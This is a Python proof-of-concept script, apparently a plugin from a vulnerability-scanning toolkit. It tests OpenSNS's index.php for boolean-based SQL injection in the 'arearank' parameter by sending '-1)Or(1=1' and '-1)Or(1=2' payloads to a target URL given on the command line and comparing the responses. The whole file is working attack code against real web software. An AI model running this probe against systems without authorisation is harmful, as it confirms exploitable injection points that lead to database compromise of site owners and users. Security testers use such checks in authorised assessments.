#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: opensns index.php 参数arearank注入
referer: unknown
author: Lucifer
description: 文件index.php中,参数arearank存在SQL注入。
'''
import sys
import requests
import warnings
from termcolor import cprint

class opensns_index_arearank_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/index.php?s=/people/index/area.html&arearank=-1)Or(1=1"
        vulnurl = self.url + payload
        vulnurl2 = self.url + "/index.php?s=/people/index/area.html&arearank=-1)Or(1=2"
        try:
            req1 = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            req2 = requests.get(vulnurl2, headers=headers, timeout=10, verify=False)
            if r"arearank/131000/arealv/2" in req1.text and r"arearank/131000/arealv/2" not in req2.text:
                cprint("[+]存在opensns index.php 参数arearank注入漏洞...(高危)\tpayload: "+vulnurl, "red")
                return True, vulnurl, "opensns index.php 参数arearank注入", payload, req1.text
            else:
                cprint("[-]不存在opensns_index_arearank漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = opensns_index_arearank_BaseVerify(sys.argv[1])
    testVuln.run()